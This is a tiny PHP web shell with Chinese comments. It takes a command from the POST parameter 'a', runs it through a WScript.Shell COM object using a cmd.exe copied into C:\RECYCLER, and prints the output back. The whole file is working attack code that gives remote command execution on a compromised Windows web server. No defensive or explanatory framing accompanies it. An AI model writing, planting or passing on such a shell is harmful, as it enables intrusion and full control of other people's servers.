<?php

$command=$_POST[a];

$wsh = new COM('WScript.shell');   // 生成一个COM对象

$exec = $wsh->exec('C:\\RECYCLER\\cmd.exe /c '.$command); //调用对象方法来执行命令,cmd要指定

$stdout = $exec->StdOut();

$stroutput = $stdout->ReadAll();

echo $stroutput;

?>